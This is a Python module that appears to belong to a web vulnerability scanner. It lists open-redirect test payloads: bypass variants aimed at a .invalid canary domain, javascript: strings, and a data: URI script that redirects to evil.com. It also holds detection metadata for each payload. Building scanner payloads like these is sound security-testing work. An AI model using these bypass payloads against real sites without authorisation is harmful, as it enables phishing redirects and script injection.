"""
web/payloads/open_redirect.py
------------------------------
Open Redirect payload library for Raven Phase 8.

Covers:
  - Absolute URL injection
  - Protocol-relative URL injection (//evil.com)
  - Backslash confusion (\/evil.com)
  - URL-encoded variants
  - javascript: pseudo-protocol
  - Parameter pollution
  - Whitespace / null byte bypass tricks

Confirmation: the response's Location header points to the evil.com
domain, OR the response body contains a link/meta-refresh to evil.com.
"""

from __future__ import annotations

from web.payloads import PayloadContext

# ── Canary domain used for all redirect payloads ──────────────────────────────

#: This domain is used as the redirect target in all payloads.
#: It must never resolve to anything sensitive. It is used purely
#: to detect whether the application follows the redirect.
CANARY_DOMAIN = "evil.raven-scan-test.invalid"

# ── Raw payload strings ────────────────────────────────────────────────────────

PAYLOADS: list[str] = [
    # ── Absolute URL ─────────────────────────────────────────────────────────
    f"https://{CANARY_DOMAIN}",
    f"http://{CANARY_DOMAIN}",
    f"https://{CANARY_DOMAIN}/redirect",
    # ── Protocol-relative ─────────────────────────────────────────────────────
    f"//{CANARY_DOMAIN}",
    f"//{CANARY_DOMAIN}/path",
    # ── Backslash confusion ───────────────────────────────────────────────────
    f"\\\\{CANARY_DOMAIN}",
    f"\\//{CANARY_DOMAIN}",
    f"/\\{CANARY_DOMAIN}",
    # ── URL-encoded variants ──────────────────────────────────────────────────
    f"%2F%2F{CANARY_DOMAIN}",
    f"%68%74%74%70%73%3A%2F%2F{CANARY_DOMAIN}",  # https:// encoded
    f"///%09/{CANARY_DOMAIN}",
    # ── javascript: pseudo-protocol ───────────────────────────────────────────
    "javascript:alert(1)",
    "javascript://alert(1)",
    # ── Whitespace bypass ─────────────────────────────────────────────────────
    f" https://{CANARY_DOMAIN}",
    f"\thttps://{CANARY_DOMAIN}",
    f"\nhttps://{CANARY_DOMAIN}",
    # ── Data URI ──────────────────────────────────────────────────────────────
    "data:text/html,<script>location='https://evil.com'</script>",
    # ── @ trick (user:pass@host misparse) ─────────────────────────────────────
    f"https://legitimate.com@{CANARY_DOMAIN}",
    f"https://legitimate.com%40{CANARY_DOMAIN}",
]

# ── Rich payload metadata ──────────────────────────────────────────────────────

CONTEXTS: list[PayloadContext] = [
    PayloadContext(
        payload=f"https://{CANARY_DOMAIN}",
        injection_type="query_param",
        expected_indicator=CANARY_DOMAIN,
        severity="Medium",
        vuln_type="OpenRedirect",
    ),
    PayloadContext(
        payload=f"//{CANARY_DOMAIN}",
        injection_type="query_param",
        expected_indicator=CANARY_DOMAIN,
        severity="Medium",
        vuln_type="OpenRedirect",
    ),
    PayloadContext(
        payload=f"\\//{CANARY_DOMAIN}",
        injection_type="query_param",
        expected_indicator=CANARY_DOMAIN,
        severity="Medium",
        vuln_type="OpenRedirect",
    ),
    PayloadContext(
        payload=f"%2F%2F{CANARY_DOMAIN}",
        injection_type="query_param",
        expected_indicator=CANARY_DOMAIN,
        severity="Medium",
        vuln_type="OpenRedirect",
    ),
    PayloadContext(
        payload="javascript:alert(1)",
        injection_type="query_param",
        expected_indicator="javascript:",
        severity="High",
        vuln_type="OpenRedirect",
    ),
    PayloadContext(
        payload=f"https://legitimate.com@{CANARY_DOMAIN}",
        injection_type="query_param",
        expected_indicator=CANARY_DOMAIN,
        severity="Medium",
        vuln_type="OpenRedirect",
    ),
]
